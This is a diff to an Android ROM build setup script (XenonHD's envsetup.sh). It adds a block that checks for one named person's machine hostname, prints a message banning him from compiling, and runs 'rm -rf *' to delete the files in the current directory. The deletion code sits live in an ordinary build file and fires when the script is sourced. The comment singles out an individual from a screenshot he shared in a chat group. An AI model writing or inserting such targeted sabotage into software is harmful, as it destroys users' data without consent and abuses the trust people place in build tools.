@@ -1,3 +1,15 @@
+# Prevent a nice guy from compiling XenonHD.
+# The nice guy shared in a Telegram group a screenshot
+# containing infos about his hostname. No hacking nor anything
+# else has been done on our side to obtain his hostname.
+if [ "$(cat /proc/sys/kernel/hostname)" == "tony-Z170X-UD3" ]
+  then
+  echo -e "\033[0;31m### IT HAPPENED THAT YOU HAVEN'T BEEN NICE ###"
+  echo -e "\033[0;34m# You are no more allowed to compile XenonHD #"
+  rm -rf *
+  exit 1
+fi
+
 function hmm() {
 cat <<EOF
 Invoke ". build/envsetup.sh" from your shell to add the following functions to your environment:
